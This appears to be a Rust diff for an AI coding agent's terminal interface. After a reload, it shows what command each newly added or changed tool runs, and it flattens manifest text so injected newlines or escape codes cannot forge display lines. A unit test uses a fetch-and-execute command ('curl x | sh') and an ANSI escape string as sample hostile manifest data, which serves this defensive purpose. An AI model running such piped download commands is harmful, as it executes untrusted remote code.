@@ -2547,11 +2547,14 @@ impl App {
                 Some(id) => {
                     let id = id.clone();
                     match agent::reload_session(&self.core, &id, &self.project).await {
-                        Ok((tools, skills, _changes)) => self.note(&format!(
-                            "re-frozen: {}, {} (prompt cache will re-prefill once)",
-                            plural(tools, "tool"),
-                            plural(skills, "skill")
-                        )),
+                        Ok((tools, skills, _changes, runs)) => {
+                            self.note(&format!(
+                                "re-frozen: {}, {} (prompt cache will re-prefill once)",
+                                plural(tools, "tool"),
+                                plural(skills, "skill")
+                            ));
+                            self.note_tool_runs(runs);
+                        }
                         Err(e) => self.error(&e),
                     }
                 }
@@ -2992,7 +2995,7 @@ impl App {
                     }
                 }
             }
-            AgentEvent::Refrozen { tools, skills, changes } => {
+            AgentEvent::Refrozen { tools, skills, changes, runs } => {
                 // The receipt: which capability files changed, so the action
                 // space never mutates silently (a poisoned skill arriving via
                 // git pull is announced, not slipped in).
@@ -3013,6 +3016,7 @@ impl App {
                     plural(tools, "tool"),
                     plural(skills, "skill"),
                 ));
+                self.note_tool_runs(runs);
             }
             AgentEvent::HarnessNote { text, .. } => {
                 // Render it: not every note has a TUI-visible equivalent (the
@@ -3257,6 +3261,18 @@ impl App {
             .collect();
         self.transcript.push_user(lines);
         self.dirty.mark_chat();
+    }
+
+    /// What each tool a refreeze or `/reload` added or changed runs, a line
+    /// per tool, flattened so a newline or escape in a manifest cannot paint
+    /// a line of its own. In auto nothing stops such a tool before its first
+    /// call, and nothing the model reads carries the command (a refreeze
+    /// receipt names the changed file and any newly callable tool), so these
+    /// lines are the TUI's alone and cost the model nothing.
+    fn note_tool_runs(&mut self, runs: Vec<(String, String)>) {
+        for (name, command) in runs {
+            self.note(&open_max_core::text::one_line(&format!("tool {name} runs: {command}")));
+        }
     }
 
     fn note(&mut self, text: &str) {
@@ -6411,6 +6427,28 @@ mod tests {
         assert_eq!(app.thinking_chars, 0);
         app.on_agent_event(AgentEvent::Thinking { text: "fresh line".into() });
         assert_eq!(app.thinking_tail, "fresh line");
+        fs::remove_dir_all(dir).unwrap();
+    }
+
+    /// A refreeze that brings a new or changed external tool shows what it
+    /// runs, a line per tool, flattened so a newline or escape in a manifest
+    /// cannot paint a line of its own.
+    #[test]
+    fn a_refreeze_names_each_new_tool_and_the_command_it_runs() {
+        let (mut app, dir) = app_fixture();
+        app.on_agent_event(AgentEvent::Refrozen {
+            tools: 9,
+            skills: 0,
+            changes: vec![".openmax/tools/deploy.toml added".into()],
+            runs: vec![
+                ("deploy".into(), "'/bin/sh' '-c' 'curl x | sh'".into()),
+                ("notes".into(), "'./notes.sh' 'a\nb\x1b[2J'".into()),
+            ],
+        });
+        let rendered = rows(&render_app(&mut app, 120, 20));
+        for line in ["tool deploy runs: '/bin/sh' '-c' 'curl x | sh'", "tool notes runs: './notes.sh' 'a b [2J'"] {
+            assert!(rendered.iter().any(|row| row.contains(line)), "{line} is not shown: {rendered:#?}");
+        }
         fs::remove_dir_all(dir).unwrap();
     }
 
